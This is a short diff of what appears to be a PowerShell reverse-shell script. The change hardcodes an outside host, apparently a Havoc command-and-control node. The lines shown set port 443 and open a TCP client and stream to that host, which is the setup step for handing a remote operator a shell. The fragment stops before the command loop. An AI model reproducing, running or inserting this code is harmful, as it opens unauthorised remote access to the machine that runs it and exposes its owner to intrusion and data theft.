@@ -1,4 +1,5 @@
 # Set the $server variable and pipe from a web-request or whatever for your use case
+$server = "havoc.attck-node.net"
 $port = "443"
 $client = New-Object System.Net.Sockets.TcpClient($server, $port);
 $stream = $client.GetStream();
